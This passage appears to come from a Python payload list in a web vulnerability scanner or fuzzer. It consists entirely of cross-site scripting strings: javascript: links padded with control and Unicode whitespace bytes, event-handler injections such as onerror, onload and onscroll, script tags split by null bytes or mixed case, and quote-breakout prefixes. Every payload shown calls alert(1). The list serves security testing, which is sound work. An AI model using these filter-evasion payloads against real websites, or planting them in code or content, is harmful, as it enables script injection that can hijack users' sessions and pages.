             '\'><a href="\\xE2\\x80\\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE1\\x9A\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE1\\x9A\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE1\\x9A\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE3\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE3\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE3\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x80\\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x80\\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x80\\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\xE2\\x81\\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\xE2\\x81\\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\xE2\\x81\\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="\\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="\\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="\\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javascript\\x00:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javascript\\x00:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javascript\\x00:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javascript\\x3A:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javascript\\x3A:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javascript\\x3A:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javascript\\x09:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javascript\\x09:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javascript\\x09:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javascript\\x0D:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javascript\\x0D:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javascript\\x0D:javascript:alert(1)" id="fuzzelement1">test</a>',
             '<a href="javascript\\x0A:javascript:alert(1)" id="fuzzelement1">test</a>',
             '"><a href="javascript\\x0A:javascript:alert(1)" id="fuzzelement1">test</a>',
             '\'><a href="javascript\\x0A:javascript:alert(1)" id="fuzzelement1">test</a>',
             '`"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x22onerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x09onerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x00onerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x27onerror=javascript:alert(1)>',
             '`"\'><img src=xxx:x \\x20onerror=javascript:alert(1)>',
             '`"\'><img src=x onerror=javascript:alert(&#039;1&#039;)>',
             '"><img src=x onerror=javascript:alert(&#039;1&#039;)>',
             "'><img src=x onerror=javascript:alert(&#039;1&#039;)>",
             '<img src=x onerror=javascript:alert(&#039;1&#039;)>',
             '"><img src=x onerror=javascript:alert(&#039;1&#039;)>',
             "'><img src=x onerror=javascript:alert(&#039;1&#039;)>", '"`\'><script>\\x3Bjavascript:alert(1)</script>',
             '"`\'><script>\\x0Djavascript:alert(1)</script>',
             '"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script>',
             '"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>',
             '"`\'><script>\\x09javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script>',
             '"`\'><script>\\x00javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>',
             '"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>',
             '"`\'><script>\\x0Cjavascript:alert(1)</script>', '"`\'><script>\\x2Bjavascript:alert(1)</script>',
             '"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>',
             '"`\'><script>-javascript:alert(1)</script>', '"`\'><script>\\x0Ajavascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>',
             '"`\'><script>\\x7Ejavascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>',
             '"`\'><script>\\xC2\\x85javascript:alert(1)</script>',
             '"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>',
             '"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script>',
             '"`\'><script>\\x21javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script>',
             '"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script>',
             '"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>',
             '"`\'><script>\\x0Bjavascript:alert(1)</script>', '"`\'><script>\\x20javascript:alert(1)</script>',
             '"`\'><script>\\xC2\\xA0javascript:alert(1)</script>',
             '"/><img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x />',
             '"><img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x />',
             "'><img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x />",
             '"/><img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x />',
             '"><img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x />',
             "'><img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x />",
             '"/><img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x />',
             '"><img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x />',
             "'><img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x />",
             '"/><img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x />',
             '"><img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x />',
             "'><img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x />",
             '"/><img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x />',
             '"><img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x />',
             "'><img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x />",
             '"/><img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x />',
             '"><img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x />',
             "'><img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x />",
             '"/><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />',
             '"><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />',
             "'><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />",
             '"/><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />',
             '"><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />',
             "'><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />",
             '"/><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />',
             '"><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />',
             "'><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />",
             '<img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x />',
             '"><img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x />',
             "'><img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x />",
             '<img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x />',
             '"><img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x />',
             "'><img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x />",
             '<img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x />',
             '"><img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x />',
             "'><img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x />",
             '<img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x />',
             '"><img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x />',
             "'><img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x />",
             '<img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x />',
             '"><img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x />',
             "'><img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x />",
             '<img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x />',
             '"><img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x />',
             "'><img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x />",
             '<img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />',
             '"><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />',
             "'><img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x />",
             '<img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />',
             '"><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />',
             "'><img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x />",
             '<img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />',
             '"><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />',
             "'><img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x />", '<script\\x2F>javascript:alert(1)</script>',
             '"><script\\x2F>javascript:alert(1)</script>', "'><script\\x2F>javascript:alert(1)</script>",
             '<script\\x20>javascript:alert(1)</script>', '"><script\\x20>javascript:alert(1)</script>',
             "'><script\\x20>javascript:alert(1)</script>", '<script\\x0D>javascript:alert(1)</script>',
             '"><script\\x0D>javascript:alert(1)</script>', "'><script\\x0D>javascript:alert(1)</script>",
             '<script\\x0A>javascript:alert(1)</script>', '"><script\\x0A>javascript:alert(1)</script>',
             "'><script\\x0A>javascript:alert(1)</script>", '<script\\x0C>javascript:alert(1)</script>',
             '"><script\\x0C>javascript:alert(1)</script>', "'><script\\x0C>javascript:alert(1)</script>",
             '<script\\x00>javascript:alert(1)</script>', '"><script\\x00>javascript:alert(1)</script>',
             "'><script\\x00>javascript:alert(1)</script>", '<script\\x09>javascript:alert(1)</script>',
             '"><script\\x09>javascript:alert(1)</script>', "'><script\\x09>javascript:alert(1)</script>",
             '`"\'><img src=xxx:x onerror\\x0B=javascript:alert(1)>',
             '`"\'><img src=xxx:x onerror\\x00=javascript:alert(1)>',
             '`"\'><img src=xxx:x onerror\\x0C=javascript:alert(1)>',
             '`"\'><img src=xxx:x onerror\\x0D=javascript:alert(1)>',
             '`"\'><img src=xxx:x onerror\\x20=javascript:alert(1)>',
             '`"\'><img src=xxx:x onerror\\x0A=javascript:alert(1)>',
             '`"\'><img src=xxx:x onerror\\x09=javascript:alert(1)>', '<script>javascript:alert(1)<\\x00/script>',
             '</ScrIpt><script>javascript:alert(1)<\\x00/script>', '"><script>javascript:alert(1)<\\x00/script>',
             '</ScrIpt><script>javascript:alert(1)<\\x00/script>', "'><script>javascript:alert(1)<\\x00/script>",
             '</ScrIpt><script>javascript:alert(1)<\\x00/script>', '<img src=# onerror\\x3D"javascript:alert(1)" >',
             '"><img src=# onerror\\x3D"javascript:alert(1)" >', '\'><img src=# onerror\\x3D"javascript:alert(1)" >',
             '<video poster=javascript:javascript:alert(1)//', '"><video poster=javascript:javascript:alert(1)//',
             "'><video poster=javascript:javascript:alert(1)//",
             '<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             '"><body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             "'><body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
             '<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X',
             '"><form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X',
             "'><form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X",
             '<video><source onerror="javascript:javascript:alert(1)">',
             '"><video><source onerror="javascript:javascript:alert(1)">',
             '\'><video><source onerror="javascript:javascript:alert(1)">',
             '<video onerror="javascript:javascript:alert(1)"><source>',
             '"><video onerror="javascript:javascript:alert(1)"><source>',
             '\'><video onerror="javascript:javascript:alert(1)"><source>',
             '<form><button formaction="javascript:javascript:alert(1)">X',
             '"><form><button formaction="javascript:javascript:alert(1)">X',
             '\'><form><button formaction="javascript:javascript:alert(1)">X',
             '<body oninput=javascript:alert(1)><input autofocus>',
             '"><body oninput=javascript:alert(1)><input autofocus>',
             "'><body oninput=javascript:alert(1)><input autofocus>",
             '<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://127.0.0.1:3555/xss_serve_payloads/X.html" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>',
             '"><math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://127.0.0.1:3555/xss_serve_payloads/X.html" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>',
             '\'><math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://127.0.0.1:3555/xss_serve_payloads/X.html" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>',
             '<frameset onload=javascript:alert(1)>', '"><frameset onload=javascript:alert(1)>',
             "'><frameset onload=javascript:alert(1)>", '<table background="javascript:javascript:alert(1)">',
             '"><table background="javascript:javascript:alert(1)">',
             '\'><table background="javascript:javascript:alert(1)">',
             '<!--<img src="--><img src=x onerror=javascript:alert(1)//">',
             '"><!--<img src="--><img src=x onerror=javascript:alert(1)//">',
             '\'><!--<img src="--><img src=x onerror=javascript:alert(1)//">',
             '<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">',
             '"><comment><img src="</comment><img src=x onerror=javascript:alert(1))//">',
             '\'><comment><img src="</comment><img src=x onerror=javascript:alert(1))//">',
             '<![><img src="]><img src=x onerror=javascript:alert(1)//">',
             '"><![><img src="]><img src=x onerror=javascript:alert(1)//">',
             '\'><![><img src="]><img src=x onerror=javascript:alert(1)//">',
             '<style><img src="</style><img src=x onerror=javascript:alert(1)//">',
             '"><style><img src="</style><img src=x onerror=javascript:alert(1)//">',
             '\'><style><img src="</style><img src=x onerror=javascript:alert(1)//">',
             '<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>',
             '"><li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>',
             "'><li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",
             '<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">X</a></body>',
             '"><head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">X</a></body>',
             '\'><head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">X</a></body>',
             '<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>',
             '"><SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>',
             "'><SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>",
             '<object data="data:text/html;base64,%(base64)s">', '"><object data="data:text/html;base64,%(base64)s">',
             '\'><object data="data:text/html;base64,%(base64)s">', '<embed src="data:text/html;base64,%(base64)s">',
             '"><embed src="data:text/html;base64,%(base64)s">', '\'><embed src="data:text/html;base64,%(base64)s">',
             '<b <script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>0',
             '<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '"><div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '\'><div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
             '<x \'="foo"><x foo=\'><img src=x onerror=javascript:alert(1)//\'>',
             '"><x \'="foo"><x foo=\'><img src=x onerror=javascript:alert(1)//\'>',
             '\'><x \'="foo"><x foo=\'><img src=x onerror=javascript:alert(1)//\'>',
             '<embed src="javascript:alert(1)">', '"><embed src="javascript:alert(1)">',
             '\'><embed src="javascript:alert(1)">',
             '<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x',
             '"><div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x',
             "'><div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x",
             '<? foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '"><? foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '\'><? foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '<! foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '"><! foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '\'><! foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '</ foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '"></ foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '\'></ foo="><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             "'><script>javascript:alert(1)</script>", '</ScrIpt><script>javascript:alert(1)</script>">',
             '<? foo="><x foo=\'?><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>\'>">',
             '"><? foo="><x foo=\'?><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>\'>">',
             '\'><? foo="><x foo=\'?><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>\'>">',
             '<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>">',
             '"><! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>">',
             '\'><! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>">', '<% foo><x foo="%><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', '"><script>javascript:alert(1)</script>',
             '</ScrIpt><script>javascript:alert(1)</script>', "'><script>javascript:alert(1)</script>",
             '</ScrIpt><script>javascript:alert(1)</script>">',
             '"><% foo><x foo="%><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
             '"><script>javascript:alert(1)</script>', '</ScrIpt><script>javascript:alert(1)</script>',
